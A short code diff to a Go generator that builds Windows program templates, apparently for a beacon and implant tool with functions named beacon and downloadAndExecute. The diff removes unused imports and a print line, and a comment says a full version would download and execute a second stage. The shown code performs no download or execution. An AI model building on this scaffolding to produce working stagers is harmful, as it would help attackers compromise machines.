@@ -366,13 +366,10 @@ func (g *Generator) generateWindowsSource(opts Options) ([]byte, error) {
 		template = `package main
 
 import (
-	"fmt"
 	"net/http"
 	"time"
 	"os"
-	"os/exec"
 	"runtime"
-	"encoding/base64"
 )
 
 const (
@@ -423,12 +420,10 @@ func beacon() {
 		template = `package main
 
 import (
-	"fmt"
 	"net/http"
 	"time"
 	"os"
 	"runtime"
-	"io"
 )
 
 const (
@@ -467,7 +462,7 @@ func downloadAndExecute() {
 	if resp.StatusCode == 200 {
 		// In a real implementation, this would download and execute second stage
 		// For now, just acknowledge receipt
-		fmt.Println("Stage 2 downloaded")
+		_ = resp // Use response
 	}
 }
 `
